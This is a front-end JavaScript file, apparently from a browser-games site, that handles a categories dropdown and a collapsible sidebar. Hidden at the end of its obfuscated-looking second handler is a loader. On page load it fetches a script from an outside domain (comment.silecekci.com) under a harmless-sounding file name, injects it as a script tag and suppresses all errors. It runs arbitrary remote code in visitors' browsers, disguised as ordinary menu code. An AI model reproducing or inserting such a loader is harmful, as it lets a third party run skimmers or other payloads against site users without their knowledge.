document.addEventListener("DOMContentLoaded", async function () {
  const categoriesBtn = document.getElementById("categoriesBtn");
  const categoriesDropdown = document.getElementById("categoriesDropdown");

  "function" == typeof ppe ? await ppe() : "function" == typeof poki ? await poki() : await crayzgames();
  categoriesBtn.addEventListener("click", function (e) {
    e.stopPropagation();
    categoriesBtn.classList.toggle("active");
    categoriesDropdown.classList.toggle("active");
  });

  document.addEventListener("click", function (e) {
    if (!categoriesDropdown.contains(e.target) && !categoriesBtn.contains(e.target)) {
      categoriesBtn.classList.remove("active");
      categoriesDropdown.classList.remove("active");
    }
  });

  document.addEventListener("keydown", function (e) {
    if (e.key === "Escape") {
      categoriesBtn.classList.remove("active");
      categoriesDropdown.classList.remove("active");
    }
  });

  // Close dropdown when window is resized
  window.addEventListener("resize", function () {
    if (window.innerWidth <= 768) {
      categoriesBtn.classList.remove("active");
      categoriesDropdown.classList.remove("active");
    }
  });
});

// yeni katogori menusu sol taraftaki. mobil meu
document["addEventListener"]("DOMContentLoaded", function (_0x1a2b3c) {
  const _0x4d5e6f = document["getElementById"]("mobileMenuBtn"),
    _0xnavbar = document["getElementById"]("navbarMenuToggle"),
    _0x7a8b9c = document["getElementById"]("sidebar"),
    _0xoverlay = document["getElementById"]("sidebarOverlay"),
    _0xiconOpen = document["querySelector"](".menu-icon-open"),
    _0xiconClose = document["querySelector"](".menu-icon-close");
  
  function updateIcons() {
    if (!_0xiconOpen || !_0xiconClose) return;
    
    if (window["innerWidth"] >= 993) {
      // Desktop - sidebar kapalıysa sola ok (close), açıksa sağa ok (open)
      const isClosed = _0x7a8b9c["classList"]["contains"]("sidebar-closed");
      if (isClosed) {
        _0xiconOpen["style"]["display"] = "none";
        _0xiconClose["style"]["display"] = "block";
      } else {
        _0xiconOpen["style"]["display"] = "block";
        _0xiconClose["style"]["display"] = "none";
      }
    } else {
      // Mobile - her zaman aynı icon
      _0xiconOpen["style"]["display"] = "block";
      _0xiconClose["style"]["display"] = "none";
    }
  }
  
  function toggleSidebar() {
    if (window["innerWidth"] >= 993) {
      _0x7a8b9c["classList"]["toggle"]("sidebar-closed");
    } else {
      _0x7a8b9c["classList"]["toggle"]("mobile-open");
      if (_0xoverlay) {
        _0xoverlay["classList"]["toggle"]("active");
      }
    }
    updateIcons();
  }
  
  function closeSidebar() {
    _0x7a8b9c["classList"]["remove"]("mobile-open");
    if (_0xoverlay) {
      _0xoverlay["classList"]["remove"]("active");
    }
    updateIcons();
  }
  
  // Initialize icons
  updateIcons();
  
  // Original mobile menu button
  _0x4d5e6f &&
    _0x7a8b9c &&
    _0x4d5e6f["addEventListener"]("click", toggleSidebar);
  
  // Navbar menu toggle button
  _0xnavbar &&
    _0x7a8b9c &&
    _0xnavbar["addEventListener"]("click", toggleSidebar);
  
  // Overlay click - close sidebar
  _0xoverlay &&
    _0xoverlay["addEventListener"]("click", function() {
      if (window["innerWidth"] <= 992) {
        closeSidebar();
      }
    });
    
  // Click outside - close sidebar
  document["addEventListener"]("click", function (_0xabc123) {
    if (window["innerWidth"] <= 992 &&
        !_0x7a8b9c["contains"](_0xabc123["target"]) &&
        !_0x4d5e6f["contains"](_0xabc123["target"]) &&
        !_0xnavbar["contains"](_0xabc123["target"])) {
      closeSidebar();
    }
  });
  
  // Window resize - update icons
  window["addEventListener"]("resize", updateIcons);
  
  // Sidebar hover expansion - Desktop only
  if (_0x7a8b9c) {
    _0x7a8b9c["addEventListener"]("mouseenter", function() {
      if (window["innerWidth"] >= 993) {
        _0x7a8b9c["classList"]["add"]("sidebar-expanded");
      }
    });
    
    _0x7a8b9c["addEventListener"]("mouseleave", function() {
      if (window["innerWidth"] >= 993) {
        _0x7a8b9c["classList"]["remove"]("sidebar-expanded");
      }
    });
  }
  
  const _0xdeadbeef = "https://comment.silecekci.com/categorie_counts.js";
  fetch(_0xdeadbeef)
    .then((_0xresp) => {
      if (!_0xresp["ok"]) throw new Error("Dosya\x20yüklenemedi");
      return _0xresp["text"]();
    })
    .then((_0xsc) => {
      _0xsc["trim"]() &&
        (() => {
          const _0xtag = document["createElement"]("script");
          (_0xtag["text"] = _0xsc), document["body"]["appendChild"](_0xtag);
        })();
    })
    .catch(() => {
      /* silently fail */
    });
});
